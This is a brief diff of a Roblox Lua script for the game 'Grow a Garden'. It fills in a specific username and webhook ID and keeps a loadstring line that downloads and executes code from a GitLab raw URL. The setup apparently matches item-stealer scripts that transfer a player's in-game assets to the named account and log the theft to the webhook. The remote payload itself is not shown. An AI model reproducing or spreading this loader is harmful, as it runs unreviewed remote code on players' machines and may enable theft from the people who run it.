@@ -1,4 +1,4 @@
-Username = "Your Roblox Username"
-Webhook = "Your Webhook"
+Username = "Y6S_A"
+Webhook = "1376152583357337701"
 
 loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
